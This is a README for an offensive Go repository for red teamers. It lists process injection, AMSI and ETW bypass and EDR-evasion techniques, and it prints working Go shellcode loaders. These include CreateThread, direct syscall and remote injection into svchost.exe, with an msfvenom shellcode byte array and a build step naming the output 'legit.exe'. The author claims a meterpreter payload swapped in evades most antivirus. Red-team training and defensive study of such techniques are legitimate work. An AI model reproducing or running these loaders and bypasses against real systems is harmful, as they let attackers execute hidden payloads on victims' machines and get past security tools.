# OffensiveGo - Golang Weaponization for red teamers.

![image](https://user-images.githubusercontent.com/75935486/220217814-242de1ba-1f62-4b0b-a1be-6cf8b82ab0da.png)


**This repo contains some examples of offensives tools & utilities rewrote in Golang that can be used in a red team engagement.**

## Table of Content

- [Previous work](#previous-work)
- [About Golang](#about-golang)  
  - [Installation](#installation)
  - [Compilation](#compilation)
- [Examples](#examples)
- [Interesting Tools in Golang](#interesting-tools-in-golang)
- [Credits](#credits)

## Previous work

These repo inspires me to make [OffensiveGo](https://github.com/RistBS/OffensiveGo)

- [OffensiveRust](https://github.com/trickster0/OffensiveRust) : Made by [trickster012](https://twitter.com/trickster012), this project contains a bunch of examples made in [Rust](https://www.rust-lang.org/).
- [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim) : Made by [byt3bl33d3r](https://twitter.com/byt3bl33d3r), this one contains examples written in [Nim](https://nim-lang.org/).


## About Golang

- **Simpler syntax**: Go's syntax is simpler and easier to learn compared to Rust, which has a steeper learning curve.
- **Garbage collection**: Go uses garbage collection, which makes memory management easier for developers. Rust, on the other hand, uses a borrow checker to enforce memory safety, which can be more difficult to work with.
- **Cross-platform support**: Go has excellent cross-platform support and can be compiled to run on a wide range of platforms, including Windows, Linux, and macOS. Rust also has good cross-platform support, but its compilation process can be more complex.
- **Goroutine**: Concurrency

**OPSEC Consideration & Caveats of Golang**

Go binaries generally have no installation dependencies, compiler statically links Go runtime and needed packages. Static linking results in larger binaries

### Installation


### Compilation

`go build` for compilation 


## Examples 

TODO : credits

| File                                                                                                   | Description                                                                                                                                                                              |
|--------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| [Process Injection - APC](../main/injection_native_apc/main.go)        | Execute a shellcode with `NtQueueApcThread`  |
| [Process Injection - CreateThread](../main/injection_native_thread/main.go)                         | Execute a shellcode with `NtCreateThreadEx`  |
| [API hashing](../main/api_hashing/main.go)                                                  | resolve APIs from EAT using DJB2 hashing algorithm (you can bring your own algorithm)  |
| [Whoami](../main/whoami/main.go)                                                  | rebuilt whoami process to show current user, groups & privileges   |
| [EnableDebugPrivileges](../main/enable_debug_priv/main.go)                                   | Enable SeDebugPrivilege in the current process    |
| [execute-assembly](../main/detect_hooks/main.go)                                                  | Loads CLR and execute .NET assemblies in memory  |
| [ACG + BlockDll](../main/acg_blockdll_process/main.go)                                                  | Apply Arbitrary Code Guard (ACG) & BlockDll policy on your process |
| [Process Argument Stomping](../main/process_arg_stomping/main.go)                                                  | Erase Process argument by parsing RtlUserProcessParameters  |
| [DNS over HTTP (DoH)](../main/dns_over_http/main.go)                                                  | A support of DNS over HTTP (DoH) for C2 communication  |
| [Detect Hooks](../main/detect_hooks/main.go)                                                 | Detect Hooks set by AV/EDR on NTDLL               |
| [Sleep Obfuscation](../main/sleep_obfuscation/main.go)                                                 | Perform Sleep Obfuscation with Queue Timers       |
| [AMSI Patching & Patchless](../main/amsi_bypasses/) | 2 Methods to bypass AMSI, first is to patch in memory with invalid value on `AmsiScanBuffer`, second is to use HWBP
| [ETW Patching & Patchless](../main/etw_bypasses/) | 2 Methods to bypass ETW, first is to patch in memory with ret on `NtTraceControl`, second is to use HWBP

## Interesting Tools in Golang

- [BananaPhone](https://github.com/C-Sto/BananaPhone) : An easy to use GO variant of [Hells gate](https://github.com/am0nsec/HellsGate) with automatic SSN parsing.
- [SourcePoint](https://github.com/Tylous/SourcePoint) : C2 profile generator for Cobalt Strike command and control servers designed to ensure evasion by reducing the Indicators of Compromise IoCs.
- [ScareCrow](https://github.com/optiv/ScareCrow) : Payload creation framework designed around EDR bypass such as AMSI & ETW Bypass, Encryption, Stealth Process Injections ect...
- [Freeze](https://github.com/optiv/Freeze) : Payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods.
- [Mangle](https://github.com/optiv/Mangle) : A tool that manipulates aspects of compiled executables (.exe or DLL) to avoid detection from EDRs.
- [Dent](https://github.com/optiv/Dent) : A framework for creating COM-based bypasses utilizing vulnerabilities in Microsoft's WDAPT sensors.
- [Ivy](https://github.com/optiv/Ivy) : Payload creation framework for the execution of arbitrary VBA (macro) source code directly in memory. Ivy’s loader does this by utilizing programmatical access in the VBA object environment to load, decrypt and execute shellcode.

### 1 - Introduction 

I won't remind you how the functions work because they basically do the same thing as if the program had been written in C. On the other hand I will briefly remind you how these techniques work.

### Method 1 : CreateThread

for this method, we load the functions from **kernel32**, set a VirtualAlloc for our shellcode and copy the shellcode to memory using `RtlMoveMemory`. Then we create our thread using `CreateThread` and set the wait status on this thread


this shellcode will simply run the calculator for learning purposes. We generate it using *msfvenom**.
```powershell
msfvenom -p windows/x64/exec CMD=calc.exe -f raw
```
```go
var buf = []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00}
```

**Compilation:**
```go
go build -buildmode=c-shared -o legit.exe runnner.go
```

![image](https://user-images.githubusercontent.com/75935486/154823436-3aaa8ddb-ea39-41e9-a584-60bfd00e5760.png)

**Code:**
```go
func CreateThread(sc []byte) {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		fmt.Printf("[!] VirutalAlloc : %s", err.Error())
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect : %s", err.Error()))
	}
	thread, _, err := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	if err.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] CreateThread : %s", err.Error()))
	}
	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}
```

![image](https://user-images.githubusercontent.com/75935486/155046052-b17eb1a2-130a-4c01-b430-bfec51f8a378.png)

I replaced the shellcode of this course by a shellcode that opens a meterpreter session and the program is still undetectable by most antivirus software including **Microsoft**

### Method 2 : Syscall

```go
func SysCall(sc []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		fmt.Printf("[!] VirutalAlloc : %s", err.Error())
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect : %s", err.Error()))
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
```
for this technique we set `VirtualAlloc` for the shellcode in **`addr` variable** and we use the syscall library from golang to initalize the syscall on the address of `addr`

![image](https://user-images.githubusercontent.com/75935486/154824956-ec67dd43-1bf4-4ce9-b529-6bb65721e18e.png)

### Method 3 : InjectProcess

for this 3rd and last method we will simply inject our shellcoded into a process which will be defined by our `FindProcess` function.
```go
pid := FindProcess("svchost.exe")
```

we load the functions from **kernel32**:
```go
kernel32 := windows.NewLazySystemDLL("kernel32.dll")
VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
```

Finally, we will use the functions loaded from **kernel32** to make the injection techniques work.
```go
proc, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))

addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(proc), nil, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(proc), addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
op := 0
_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(proc), addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&op)))
_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(proc), 0, 0, addr, 0, 0, 0)
errCloseHandle := windows.CloseHandle(proc)
```

## Credits

- [@BlueSentinelSec](https://twitter.com/BlueSentinelSec) - https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/Offensive%20GoLang%202.0%20-%20SANS%20Pen%20Test%20HackFest%202021.pdf
